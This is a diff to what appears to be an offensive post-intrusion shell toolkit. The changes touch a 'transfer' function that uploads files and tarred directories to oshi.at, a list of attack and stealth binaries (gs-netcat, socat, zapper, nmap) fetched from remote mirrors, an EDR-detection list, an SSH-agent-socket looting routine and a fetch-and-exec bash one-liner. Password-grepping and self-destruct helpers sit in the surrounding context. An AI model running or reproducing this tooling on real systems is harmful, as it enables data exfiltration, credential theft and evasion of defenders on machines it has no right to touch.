@@ -357,11 +357,11 @@ xorpipe() { xor "${1:-0xfa}" | sed 's/\r/\n/g'; }
 HS_TRANSFER_PROVIDER="oshi.at"
 
 transfer() {
-    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
-    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
+    [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer <file/directory> [remote file name]\n    transfer [name] <FILENAME"; return 255; }
+    [[ ! -t 0 ]] && { curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
     [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
-    [[ -d "$1" ]] && { (cd "${1}/.." && tar cfz - "${1##*/}")|curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
-    curl -SsfL --connect-timeout 7 --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${1##*/}"
+    [[ -d "$1" ]] && { (cd "${1}/.." && tar cfz - "${1##*/}")|curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}.tar.gz}"; return; }
+    curl -SsfL --connect-timeout 7 --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}}"
 }
 
 # SHRED without shred command
@@ -456,12 +456,12 @@ ghostip() {
 
 ltr() {
 	[ $# -le 0 ] && set -- .
-    find "$@" -printf "%T@ %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
+    find "$@" -printf "%T@ %M % 8.8u %-8.8g % 10s %Tc %P\n" | sort -n | cut -f2- -d' '
 }
 
 lssr() {
 	[ $# -le 0 ] && set -- .
-    find "$@" -printf "%s %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
+    find "$@" -printf "%s %M % 8.8u %-8.8g % 10s %Tc %P\n" | sort -n | cut -f2- -d' '
 }
 
 
@@ -621,6 +621,8 @@ hgrep() {
     grep -HEronasie  ".{,16}${1:-password}.{,32}" .
 }
 
+# FIXME: Should we used SOAR instead? Can SOAR be made stealthy by setting HOME=$XHOME?
+# https://github.com/pkgforge/soar
 dbin() {
     local cdir
     { [ -n "${XHOME}" ] && [ -f "${XHOME}/dbin" ]; } || { bin dbin || return; }
@@ -668,53 +670,63 @@ _bin_single() {
     local single="${1}" # might be empty "".
 
     unset _HS_SINGLE_MATCH
-    # bin_dl anew         "https://bin.ajam.dev/${a}/anew-rs" # fuck anew-rs, it needs argv[1] and is not compatible.
-    bin_dl anew         "https://bin.ajam.dev/${a}/anew"
-    bin_dl awk          "https://bin.ajam.dev/${a}/Baseutils/gawk/gawk"
-    # bin_dl awk          "https://bin.ajam.dev/${a}/awk"
-    bin_dl base64       "https://bin.ajam.dev/${a}/Baseutils/coreutils/base64"
-    bin_dl busybox      "https://bin.ajam.dev/${a}/Baseutils/busybox/busybox"
-    bin_dl curl         "https://bin.ajam.dev/${a}/curl"
+    # bin_dl anew         "https://bin.pkgforge.dev/${a}/anew-rs" # fuck anew-rs, it needs argv[1] and is not compatible.
+    bin_dl anew         "https://bin.pkgforge.dev/${a}/anew"
+    bin_dl awk          "https://bin.pkgforge.dev/${a}/Baseutils/gawk/gawk"
+    # bin_dl awk          "https://bin.pkgforge.dev/${a}/awk"
+    bin_dl base64       "https://bin.pkgforge.dev/${a}/Baseutils/coreutils/base64"
+    bin_dl busybox      "https://bin.pkgforge.dev/${a}/Baseutils/busybox/busybox"
+    bin_dl curl         "https://bin.pkgforge.dev/${a}/curl"
 
-    bin_dl "dbin"       "https://github.com/xplshn/dbin/releases/latest/download/dbin_${arch_alt}"
+    bin_dl dbin         "https://github.com/xplshn/dbin/releases/latest/download/dbin_${arch_alt}"
     # export DBIN_INSTALL_DIR="${XHOME}"
 
-    bin_dl fd           "https://bin.ajam.dev/${a}/fd-find"
+    bin_dl fd           "https://bin.pkgforge.dev/${a}/fd-find"
 
-    bin_dl gost         "https://bin.ajam.dev/${a}/gost"
+    bin_dl gost         "https://bin.pkgforge.dev/${a}/gost"
     bin_dl gs-netcat    "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_${os,,}-${arch}"
-    # bin_dl gs-netcat    "https://bin.ajam.dev/${a}/gs-netcat" #fetched straight from https://github.com/hackerschoice/gsocket (avoid GH ratelimit)
-    bin_dl grep         "https://bin.ajam.dev/${a}/Baseutils/grep/grep"
-    bin_dl gzip         "https://bin.ajam.dev/${a}/Baseutils/gzip/gzip"
-    bin_dl hexdump      "https://bin.ajam.dev/${a}/Baseutils/util-linux/hexdump"
-    bin_dl jq           "https://bin.ajam.dev/${a}/jq"
-    bin_dl nc           "https://bin.ajam.dev/${a}/ncat"
-    # bin_dl nc           "https://bin.ajam.dev/${a}/Baseutils/netcat/netcat" #: https://www.libressl.org/
-    bin_dl netstat      "https://bin.ajam.dev/${a}/Baseutils/nettools/netstat"
-    bin_dl nmap         "https://bin.ajam.dev/${a}/nmap"
-    bin_dl noseyparker  "https://bin.ajam.dev/${a}/noseyparker"
+    # bin_dl gs-netcat    "https://bin.pkgforge.dev/${a}/gs-netcat" #fetched straight from https://github.com/hackerschoice/gsocket (avoid GH ratelimit)
+    bin_dl grep         "https://bin.pkgforge.dev/${a}/Baseutils/grep/grep"
+    bin_dl gzip         "https://bin.pkgforge.dev/${a}/Baseutils/gzip/gzip"
+    bin_dl hexdump      "https://bin.pkgforge.dev/${a}/Baseutils/util-linux/hexdump"
+    bin_dl jq           "https://bin.pkgforge.dev/${a}/jq"
+    bin_dl nc           "https://bin.pkgforge.dev/${a}/ncat"
+    # bin_dl nc           "https://bin.pkgforge.dev/${a}/Baseutils/netcat/netcat" #: https://www.libressl.org/
+    bin_dl netstat      "https://bin.pkgforge.dev/${a}/Baseutils/nettools/netstat"
+    bin_dl nmap         "https://bin.pkgforge.dev/${a}/nmap"
+    bin_dl noseyparker  "https://bin.pkgforge.dev/${a}/noseyparker"
     # [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
-    bin_dl openssl      "https://bin.ajam.dev/${a}/Baseutils/openssl/openssl"
-    bin_dl ping         "https://bin.ajam.dev/${a}/Baseutils/iputils/ping"
-    bin_dl ps           "https://bin.ajam.dev/${a}/Baseutils/procps/ps"
-    bin_dl reptyr       "https://bin.ajam.dev/${a}/reptyr"
-    bin_dl rg           "https://bin.ajam.dev/${a}/ripgrep"
-    bin_dl rsync        "https://bin.ajam.dev/${a}/rsync"
-    bin_dl script       "https://bin.ajam.dev/${a}/Baseutils/util-linux/script"
-    bin_dl sed          "https://bin.ajam.dev/${a}/Baseutils/sed"
-    bin_dl socat        "https://bin.ajam.dev/${a}/socat"
-    bin_dl strace       "https://bin.ajam.dev/${a}/strace"
-    bin_dl tar          "https://bin.ajam.dev/${a}/Baseutils/tar/tar"
-    bin_dl tcpdump      "https://bin.ajam.dev/${a}/tcpdump"
+    bin_dl openssl      "https://bin.pkgforge.dev/${a}/Baseutils/openssl/openssl"
+    bin_dl ping         "https://bin.pkgforge.dev/${a}/Baseutils/iputils/ping"
+    bin_dl ps           "https://bin.pkgforge.dev/${a}/Baseutils/procps/ps"
+    bin_dl reptyr       "https://bin.pkgforge.dev/${a}/reptyr"
+    bin_dl rg           "https://bin.pkgforge.dev/${a}/ripgrep"
+    bin_dl rsync        "https://bin.pkgforge.dev/${a}/rsync"
+    bin_dl script       "https://bin.pkgforge.dev/${a}/Baseutils/util-linux/script"
+    bin_dl sed          "https://bin.pkgforge.dev/${a}/Baseutils/sed"
+    bin_dl socat        "https://bin.pkgforge.dev/${a}/socat"
+    bin_dl strace       "https://bin.pkgforge.dev/${a}/strace"
+    bin_dl tar          "https://bin.pkgforge.dev/${a}/Baseutils/tar/tar"
+    bin_dl tcpdump      "https://bin.pkgforge.dev/${a}/tcpdump"
+    # bin_dl vi           "https://bin.pkgforge.dev/${a}/Baseutils/vim/vi"
+    bin_dl vim          "https://bin.pkgforge.dev/${a}/Baseutils/vim/vim"
     bin_dl zapper       "https://github.com/hackerschoice/zapper/releases/latest/download/zapper-${os,,}-${arch}"
-    bin_dl zgrep        "https://bin.ajam.dev/${a}/Baseutils/gzip/zgrep"
+    bin_dl zgrep        "https://bin.pkgforge.dev/${a}/Baseutils/gzip/zgrep"
 
+    { [ -z "$single" ] || [ "$single" == "busybox" ]; } && {
+        # Only create busybox-bins for bins that do not yet exist.
+        busybox --list | while read -r fn; do
+            command -v "$fn" >/dev/null && continue
+            [ -e "${XHOME}/${fn}" ] && continue
+            ln -s "busybox" "${XHOME}/${fn}"
+        done
+    }
     [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
         local str="${single##*/}"
         local loc="${single}"
         [ "$str" == "cme" ] && HS_WARN "CME is obsolete. Try ${CDC}bin netexec${CN}"
         [ "$str" == "crackmapexec" ] && HS_WARN "CrackMapExec is obsolete. Try ${CDC}bin netexec${CN}"
-        bin_dl "${str}" "https://bin.ajam.dev/${a}/${loc}"
+        bin_dl "${str}" "https://bin.pkgforge.dev/${a}/${loc}"
     }
 }
 
@@ -969,6 +981,8 @@ _warn_edr() {
     _hs_chk_fn "/opt/FortiEDRCollector"                     "Fortinet FortiEDR"
     _hs_chk_fn "/opt/fortinet/fortisiem"                    "Fortinet FortiSIEM"
     _hs_chk_fn "/etc/init.d/fortisiem-linux-agent"          "Fortinet FortiSIEM"
+    _hs_chk_fn "/usr/bin/ada"                               "Group-iB Advanced Detection Analysis"
+    _hs_chk_fn "/usr/bin/linep"                             "Group-iB XDR Endpoint Agent"
     _hs_chk_fn "/usr/local/bin/intezer-analyze"             "Intezer"
     _hs_chk_fn "/opt/kaspersky"                             "Kaspersky"
     _hs_chk_fn "/etc/init.d/kics"                           "Kaspersky Industrial CyberSecurity"
@@ -1080,15 +1094,13 @@ _warn_rk() {
     [ "$n" -gt 0 ] && { [ $((n & 1)) -eq 1 ] || [ $((n>>12 & 1)) -eq 1 ] || [ $((n>>13 & 1)) -eq 1 ]; } && tainted=1
 
     [ -z "$tainted" ] && return
-    
     echo -e "${CR}Non standard LKM detected${CF} (/proc/sys/kernel/tainted=$n)"
     command -v modinfo >/dev/null && cat "/proc/modules" 2>/dev/null | while read -r m; do
         m="${m%% *}"
         str="$(modinfo "$m" 2>/dev/null)" || continue
-        { [[ "$str" != *"Build time autogenerated kernel"* ]] || [[ "$str" != *"intree:         Y"* ]]; } && {
-            modinfo "$m" | grep --color=never -E '(^filename|^author)'
-            continue
-        }
+        [[ "$str" == *"Build time autogenerated kernel"* ]] && continue
+        [[ "$str" == *"intree:         Y"* ]] && continue
+        modinfo "$m" | grep --color=never -E '(^filename|^author)'
     done
     echo -en "${CN}"
     # Also: cat /sys/kernel/tracing/available_filter_functions*| grep <module_name>
@@ -1125,7 +1137,7 @@ lootlight() {
     local str
     ls -al "${ROOTFS}"/tmp/ssh-* &>/dev/null && {
         echo -e "${CB}SSH_AUTH_SOCK${CDY}${CF}"
-        find "${ROOFS}"/tmp -name 'agent.*' | while read -r fn; do
+        find "${ROOFS}"/tmp -name 'agent.*' 2>/dev/null | while read -r fn; do
             unset str
             command -v lsof >/dev/null && lsof -n "$fn" &>/dev/null && str="[ACTIVE]"
             echo "$(ls -al "$fn")"$'\t'"${str}"
@@ -1469,6 +1481,7 @@ _hs_destruct() {
 xdestruct() {
     _hs_destruct
     export HOME="${_HS_HOME_ORIG}"
+    [ -n "$_HS_PATH_ORIG" ] && export PATH="$_HS_PATH_ORIG"
 }
 
 # memexec /bin/sh -c "echo hi"
@@ -1573,7 +1586,7 @@ hs_init() {
 
     _hs_init_rootfs
     [ -z "$BASH" ] && {
-        str="https://bin.ajam.dev/$(uname -m)/bash"
+        str="https://bin.pkgforge.dev/$(uname -m)/bash"
         [[ "$(uname -m)" == i686 ]] && str='https://github.com/polaco1782/linux-static-binaries/raw/refs/heads/master/x86-i686/bash'
         HS_WARN "Shell is not BASH. Try:
 ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
@@ -1722,6 +1735,7 @@ hs_init_shell() {
     export TMPDIR
     [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"
 
+    [ -z "$_HS_PATH_ORIG" ] && _HS_PATH_ORIG="$PATH"
     [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
     # Might already exist.
     [ -d "$XHOME" ] && _hs_xhome_init
